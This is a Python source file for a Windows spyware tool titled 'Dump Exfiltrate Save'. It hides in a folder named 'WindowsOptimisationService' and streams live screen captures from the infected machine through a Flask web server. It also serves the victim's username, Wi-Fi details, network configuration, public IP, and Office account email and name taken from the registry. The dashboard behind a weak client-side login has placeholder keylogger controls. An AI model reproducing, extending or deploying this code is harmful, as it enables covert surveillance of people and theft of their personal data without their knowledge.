import os
import threading
import time
import socket
import io
from collections import deque
from flask import Flask, Response, render_template_string, send_file, jsonify
import mss
from PIL import Image
import platform
import psutil
import subprocess
import requests
import winreg

# Create Flask app
app = Flask(__name__)

# Create directory function
def make():
    user_login = os.getlogin()
    screenShareDir = f"C:\\Users\\{user_login}\\WindowsOptimisationService"
    os.makedirs(screenShareDir, exist_ok=True)
    os.chdir(screenShareDir)

# Capture images function
def capture_images():
    global images
    with mss.mss() as sct:
        monitor = sct.monitors[1]
        while True:
            start = time.time()
            sct_img = sct.grab(monitor)
            img = Image.frombytes('RGB', sct_img.size, sct_img.rgb)
            with io.BytesIO() as output:
                img.save(output, format='PNG')
                images.append(output.getvalue())
                if len(images) > 5:
                    images.popleft()
            elapsed = time.time() - start
            time.sleep(max(0, 1/120 - elapsed))

# Get local IP function
def get_local_ip():
    return socket.gethostbyname(socket.gethostname())

# Define the global images variable
images = deque(maxlen=5)

SERVER_HOST = get_local_ip()
SERVER_PORT = 31338

# HTML templates
login_page = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="author" content="Fedi6431">
    <meta name="description" content="The Project Dump Exfiltrate Save (P-DES) is a project made by Fede to retrieve informations & PC usages">
    <meta name="copyright" content="Fedi 2025©">
    <meta name="dc.language" content="ita" scheme="RFC1766">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dump Exfiltrate Save | DES</title>
    <script>
        function checkCredentials() {{
            var YKMs6nmx7VcV63i = document.getElementById("m2SxXVmW3tWogiS").value;
            var BeGhkaQXpn4UplY = document.getElementById("ozOSNlUtEYo4mts").value;
            var hovAsGEJkOG0mIq = btoa(BeGhkaQXpn4UplY); 
            var KDKl8J3Ih7uU0l2 = btoa(YKMs6nmx7VcV63i)

            if (KDKl8J3Ih7uU0l2 === "UERFUy1BZG1pbg==" && hovAsGEJkOG0mIq === "UERFUy1QYXNzd29yZA==") {{
                alert("Login successful");
                window.location.replace("http://{SERVER_HOST}:{SERVER_PORT}/4ee1711430410e5f2ec9d8188ac1f134");
            }} else {{
                alert("Invalid username or password");
            }}
        }}
    </script>
</head>
<body>
    <h2>Admin Login</h2>
    <form onsubmit="event.preventDefault(); checkCredentials();">
        <div>
            <label for="">Username:</label>
            <input type="text" id="m2SxXVmW3tWogiS" name="">
        </div>
        <div>
            <label for="password">Password:</label>
            <input type="password" id="ozOSNlUtEYo4mts" name="">
        </div>
        <div>
            <button type="submit">Login</button>
        </div>
    </form>
</body>
</html>"""

dashboard_page = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="author" content="Fedi6431">
    <meta name="description" content="The Project Dump Exfiltrate Save (P-DES) is a project made by Fede to retrieve informations & PC
    <meta name="copyright" content="Fedi 2025©">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dump Exfiltrate Save | DES</title>
</head>
<body>
    <h1>Action available</h1>
    <ol>
        <li><a href="#ScreenShare">Screen share</a></li>
        <li><a href="#Keylogger">Keylogger log</a></li>
        <li><a href="#Usage">Usage stats</a></li>
    </ol>
    <div id="screenShare">
        <script>
            function updateImage() {{
                const img = document.getElementById('screenshot');
                img.src = '/image.png?' + new Date().getTime();
            }}
            setInterval(updateImage, 100); // 10 FPS

            function saveScreenshot() {{
                const link = document.createElement('a');
                link.href = '/download.png';
                link.download = 'screenshot.png';
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
            }}

            const refreshBtn = document.getElementById("btnRefresh");
            function handleClick() {{
                history.go(0);
            }}

            refreshBtn.addEventListener("click", handleClick);
        </script>
        <h1>Screen share</h1>
        <button type="button" onclick="saveScreenshot()">Take &#38; Download screenshot from host</button>
        <button id="btnRefresh" type="button" onclick="location.reload(true)">Refresh page</button>
        <div>
            <img id="screenshot" src="/image.png" alt="Screenshot" />
        </div>
    </div>
    <div id="Keylogger">
        <h1>Keylogger</h1>
        <button type="button">Start keylogger</button>
        <button type="button">Stop keylogger</button>
    </div>
    <div id="Usage">
        <h1>PC informations</h1>
        <p>Hey, we have another page for the PC information. If you want them go to <a href="/16f0ada2144eaa0b96478073d5e3d78b">this page</a></p>
    </div>
</body>
</html>"""

@app.route('/')
def login():
    return render_template_string(login_page)

@app.route('/4ee1711430410e5f2ec9d8188ac1f134')
def dashboard():
    return render_template_string(dashboard_page)

@app.route('/image.png')
def image():
    if images:
        return Response(images[-1], mimetype='image/png')
    return "404 Not Found", 404

@app.route('/download.png')
def download_image():
    if images:
        return send_file(io.BytesIO(images[-1]), mimetype='image/png', as_attachment=True, download_name='screenshot.png')
    return "404 Not Found", 404

@app.route('/16f0ada2144eaa0b96478073d5e3d78b')
def informations():
    user_login = os.getlogin()  # Get the current logged-in username
    wifi_list = scan_wifi()  # Get the list of available Wi-Fi networks
    system_info = {
        "Username": user_login,
        "Operating System": platform.system(),
        "OS Version": platform.version(),
        "Architecture": platform.architecture(),
        "Processor": platform.processor(),
        "CPU Cores": psutil.cpu_count(logical=False),
        "Logical CPUs": psutil.cpu_count(logical=True),
        "Memory": f"{psutil.virtual_memory().total / (1024 ** 3):.2f} GB",
        "Used Memory": f"{psutil.virtual_memory().used / (1024 ** 3):.2f} GB",
        "Free Memory": f"{psutil.virtual_memory().available / (1024 ** 3):.2f} GB",
        "Disk Usage": f"{psutil.disk_usage('/').total / (1024 ** 3):.2f} GB",
        "Used Disk": f"{psutil.disk_usage('/').used / (1024 ** 3):.2f} GB",
        "Free Disk": f"{psutil.disk_usage('/').free / (1024 ** 3):.2f} GB",
        "Hostname": socket.gethostname(),  # Get the hostname of the machine
        "IP Address": get_local_ip(),  # Get the local IP address
        "Public IP": getPublicIp(),  # Get the public IP address
        "Local Network Info": getLocalNetworkInfo(),  # Get local network configuration
        "WiFi Networks": wifi_list,  # List of available Wi-Fi networks
        "Registry User Info": getUserInfoFromRegistry()  # Get user info from the registry
    }
    return jsonify(system_info)

def scan_wifi():
    try:
        result = subprocess.check_output(["netsh", "wlan", "show", "all"], encoding='utf-8')
        return result
    except Exception as e:
        return str(e)  # Return the error message if scanning fails

# Static methods for additional functionalities
@staticmethod
def getPublicIp():
    try:
        return requests.get('https://api.ipify.org').content.decode('utf8')
    except requests.RequestException as e:
        return f"Error getting public IP: {str(e)}"

@staticmethod
def getLocalNetworkInfo():
    try:
        result = subprocess.run(["ipconfig", "/all"], capture_output=True, text=True, check=True)
        return result.stdout  # Return the standard output
    except subprocess.CalledProcessError as e:
        return f"Error executing command: {str(e)}"
    except Exception as e:
        return f"An error occurred: {str(e)}"


@staticmethod
def getRegistryValue(path, key):
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, path) as keyHandle:
            return winreg.QueryValueEx(keyHandle, key)[0]
    except FileNotFoundError:
        return None
    except Exception as e:
        return str(e)

@staticmethod
def getUserInfoFromRegistry():
    userInfo = {}
    registryPath = r"Software\\Microsoft\\Office\\16.0\\Common\\Identity\\Identities"
    
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, registryPath) as parentKey:
            i = 0
            while True:
                try:
                    subkeyName = winreg.EnumKey(parentKey, i)
                    subkeyPath = f"{registryPath}\\{subkeyName}"
                    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, subkeyPath) as subkey:
                        email = getRegistryValue(subkeyPath, "EmailAddress")
                        if email:
                            userInfo["EmailAddress"] = email
                        firstName = getRegistryValue(subkeyPath, "FirstName")
                        if firstName:
                            userInfo["FirstName"] = firstName
                        lastName = getRegistryValue(subkeyPath, "LastName")
                        if lastName:
                            userInfo["LastName"] = lastName
                        if len(userInfo) == 3:
                            break
                except OSError:
                    break
                i += 1
    except Exception as e:
        userInfo['Error'] = str(e)
    
    return userInfo

if __name__ == "__main__":
    make()
    images = deque(maxlen=5)
    threading.Thread(target=capture_images, daemon=True).start()
    app.run(host=get_local_ip(), port=SERVER_PORT)
